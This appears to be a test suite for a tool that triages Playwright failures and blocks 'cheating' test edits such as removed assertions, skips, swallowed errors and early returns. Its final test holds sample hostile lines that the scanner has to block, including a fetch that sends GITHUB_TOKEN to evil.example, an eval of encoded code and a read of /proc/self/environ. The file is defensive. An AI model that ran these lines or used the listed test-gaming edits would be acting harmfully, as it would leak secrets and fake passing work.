import assert from 'node:assert/strict';
import { test } from 'node:test';
import { scanChange, triage } from '../dist/index.js';

test('triage: flaky verdicts win', () => {
  assert.equal(triage({ kind: 'assertion', message: 'x', flakyVerdict: 'FLAKY' }).category, 'FLAKY');
  assert.equal(triage({ kind: 'timeout', message: 'x', flakyVerdict: 'NOT REPRODUCING' }).category, 'FLAKY');
});

test('triage: environment failures', () => {
  assert.equal(triage({ kind: 'browser-crash', message: '' }).category, 'ENV');
  assert.equal(triage({ kind: 'assertion', message: 'page.goto: net::ERR_CONNECTION_REFUSED at http://localhost:3000' }).category, 'ENV');
  assert.equal(triage({ kind: 'syntax', message: 'SyntaxError' }).category, 'ENV');
});

test('triage: a value mismatch on a found element is an app bug, even if the engine offers a locator', () => {
  const t = triage({ kind: 'assertion', message: 'Expected: "$10"\nReceived: "$12"', expected: '"$10"', actual: '"$12"', locatorFix: true });
  assert.equal(t.category, 'APP_BUG');
  assert.equal(t.rootCause, 'REGRESSION');
});

test('triage: missing element is locator drift', () => {
  const t = triage({ kind: 'assertion', message: "Locator: locator('#greeting')\nExpected: \"Hi\"\nError: element(s) not found", expected: '"Hi"' });
  assert.equal(t.category, 'TEST_BUG');
  assert.equal(t.rootCause, 'LOCATOR_DRIFT');
  const click = triage({ kind: 'timeout', message: "Test timeout of 15000ms exceeded.\nwaiting for getByRole('button', { name: 'Log in' })" });
  assert.equal(click.rootCause, 'LOCATOR_DRIFT');
  assert.equal(triage({ kind: 'assertion', message: 'x', locatorFix: true }).confidence, 0.9);
});

test('triage: hydration and mock drift', () => {
  assert.equal(triage({ kind: 'timeout', message: 'element is not attached to the DOM' }).rootCause, 'HYDRATION_RACE');
  assert.equal(triage({ kind: 'assertion', message: 'x', mockDrift: true }).rootCause, 'MOCK_DRIFT');
});

test('triage: no signal defaults to a possible app bug with low confidence', () => {
  const t = triage({ kind: 'unknown', message: 'something odd' });
  assert.equal(t.category, 'APP_BUG');
  assert.ok(t.confidence < 0.6);
});

const base = `import { test, expect } from '@playwright/test';
test('a', async ({ page }) => {
  await page.goto('/');
  await page.getByRole('button', { name: 'Log in' }).click();
  await expect(page.getByRole('status')).toHaveText('ok');
});
`;

test('cheat scan: a locator change passes', () => {
  assert.equal(scanChange(base, base.replace('Log in', 'Sign in')).verdict, 'PASS');
});

test('cheat scan: removing an assertion is blocked', () => {
  const r = scanChange(base, base.replace("  await expect(page.getByRole('status')).toHaveText('ok');\n", ''));
  assert.equal(r.verdict, 'BLOCK');
  assert.ok(r.findings.some((f) => f.rule === 'assertion-removed'));
});

test('cheat scan: commenting out an assertion is blocked', () => {
  assert.equal(scanChange(base, base.replace('  await expect(', '  // await expect(')).verdict, 'BLOCK');
});

test('cheat scan: skip, only, fixme and removed tests are blocked', () => {
  assert.equal(scanChange(base, base.replace("test('a'", "test.skip('a'")).verdict, 'BLOCK');
  assert.equal(scanChange(base, base.replace("test('a'", "test.only('a'")).verdict, 'BLOCK');
  assert.equal(scanChange(base, "import { test } from '@playwright/test';\n").verdict, 'BLOCK');
});

test('cheat scan: early return and swallowed errors are blocked', () => {
  assert.equal(scanChange(base, base.replace("  await page.goto('/');", "  await page.goto('/');\n  return;")).verdict, 'BLOCK');
  const swallowed = base.replace("  await page.getByRole('button', { name: 'Log in' }).click();", "  try { await page.getByRole('button', { name: 'Log in' }).click(); } catch {}");
  assert.equal(scanChange(base, swallowed).verdict, 'BLOCK');
  assert.equal(scanChange(base, base.replace('.click();', '.click().catch(() => {});')).verdict, 'BLOCK');
});

test('cheat scan: raised timeouts, fixed waits and force are warnings', () => {
  assert.equal(scanChange(base, base.replace('.click();', '.click({ timeout: 60000 });')).verdict, 'WARN');
  assert.equal(scanChange(base, base.replace("  await page.goto('/');", "  await page.goto('/');\n  await page.waitForTimeout(3000);")).verdict, 'WARN');
  assert.equal(scanChange(base, base.replace('.click();', '.click({ force: true });')).verdict, 'WARN');
  assert.equal(scanChange(base, base.replace(".toHaveText('ok')", '.toBeTruthy()')).verdict, 'WARN');
});

test('cheat scan: python skips and xfail are blocked', () => {
  const py = 'def test_login(page):\n    page.goto("/")\n    expect(page.get_by_role("status")).to_have_text("ok")\n';
  assert.equal(scanChange(py, `import pytest\n@pytest.mark.xfail\n${py}`).verdict, 'BLOCK');
  assert.equal(scanChange(py, py.replace('    expect(page.get_by_role("status")).to_have_text("ok")\n', '')).verdict, 'BLOCK');
});

test('cheat scan: code that reaches outside the test (secrets, processes, network) is blocked', () => {
  const base = "test('a', async ({ page }) => {\n  await page.getByRole('button', { name: 'Save' }).click();\n  await expect(page.getByRole('status')).toHaveText('ok');\n});\n";
  const add = (line) => base.replace("  await expect", `${line}\n  await expect`);
  for (const line of [
    '  await fetch(`https://evil.example/?t=${process.env.GITHUB_TOKEN}`);',
    "  require('child_process').execSync('env');",
    "  const fs = await import('node:fs');",
    "  eval(atob('ZmV0Y2goKQ=='));",
    "  await page.goto('file:///proc/self/environ');",
  ]) {
    const r = scanChange(base, add(line));
    assert.equal(r.verdict, 'BLOCK', line);
    assert.ok(r.findings.some((f) => f.rule === 'unsafe-code'), line);
  }
  const py = 'def test_a(page):\n    page.get_by_role("button", name="Save").click()\n';
  assert.equal(scanChange(py, `import os\n${py}    print(os.environ)\n`).verdict, 'BLOCK');
  // Code that was already there and is only moved is fine.
  const withEnv = base.replace("  await page", "  const url = process.env.BASE_URL;\n  await page");
  assert.equal(scanChange(withEnv, withEnv.replace("name: 'Save'", "name: 'Save changes'")).verdict, 'PASS');
});
